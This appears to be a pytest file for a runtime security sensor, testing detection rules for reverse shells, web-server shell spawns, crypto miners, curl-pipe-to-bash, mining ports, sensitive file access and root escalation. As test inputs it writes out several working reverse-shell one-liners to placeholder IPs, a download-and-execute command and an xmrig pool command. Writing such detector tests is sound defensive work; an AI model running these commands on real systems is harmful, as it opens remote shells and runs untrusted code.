from runtime_sensor.detections import apply_detections
from runtime_sensor.schema import FileInfo, NetworkInfo, ProcessInfo, RuntimeEvent


def proc(cmd, name=None, exe=None, parent=None, euid=None):
    return RuntimeEvent(event_type="process_exec",
                        process=ProcessInfo(pid=2, ppid=1, name=name or cmd.split()[0], exe=exe, cmdline=cmd,
                                            parent_name=parent, euid=euid))


def test_shell_from_web_server():
    ev = apply_detections(proc("/bin/sh -c id", name="sh", exe="/bin/sh", parent="nginx"))
    assert ev.severity_hint == "high" and "shell_spawned_by_web_server" in ev.tags


def test_shell_from_normal_parent_is_benign():
    ev = apply_detections(proc("bash", exe="/bin/bash", parent="sshd"))
    assert ev.severity_hint == "info" and ev.tags == []


def test_reverse_shells():
    for cmd in ("nc -e /bin/sh 10.0.0.1 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "socat tcp:1.2.3.4:4444 exec:/bin/sh",
                "python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"):
        ev = apply_detections(proc(cmd))
        assert ev.severity_hint == "critical" and "reverse_shell" in ev.tags, cmd


def test_nc_listen_is_not_reverse_shell():
    assert "reverse_shell" not in apply_detections(proc("nc -lvnp 8080")).tags


def test_miner():
    ev = apply_detections(proc("./xmrig -o stratum+tcp://pool.minexmr.com:4444", exe="/tmp/xmrig"))
    assert "crypto_miner" in ev.tags and ev.severity_hint == "high"


def test_curl_pipe_sh():
    ev = apply_detections(proc("sh -c curl -fsSL http://x.example/i.sh | bash"))
    assert "download_and_execute" in ev.tags
    assert "download_and_execute" not in apply_detections(proc("curl -o out http://x")).tags


def test_mining_port():
    ev = RuntimeEvent(event_type="network_connect",
                      network=NetworkInfo(src_ip="10.0.0.1", src_port=1, dst_ip="1.1.1.1", dst_port=3333))
    assert "suspicious_port:mining_pool" in apply_detections(ev).tags


def test_sensitive_files():
    ev = RuntimeEvent(event_type="file_access", file=FileInfo(path="/etc/shadow", operation="write"))
    assert apply_detections(ev).severity_hint == "high"
    ev = RuntimeEvent(event_type="file_access", file=FileInfo(path="/root/.ssh/authorized_keys", operation="write"))
    assert "ssh_authorized_keys_modified" in apply_detections(ev).tags
    ev = RuntimeEvent(event_type="file_access", file=FileInfo(path="/home/a/.ssh/id_ed25519", operation="open"))
    assert "ssh_private_key_read" in apply_detections(ev).tags
    ev = RuntimeEvent(event_type="file_access", file=FileInfo(path="/home/a/.ssh/id_ed25519.pub", operation="open"))
    assert apply_detections(ev).tags == []


def test_privilege_change_to_root():
    ev = RuntimeEvent(event_type="privilege_change", process=ProcessInfo(pid=5, uid=1000, euid=0))
    assert "privilege_escalation_to_root" in apply_detections(ev).tags
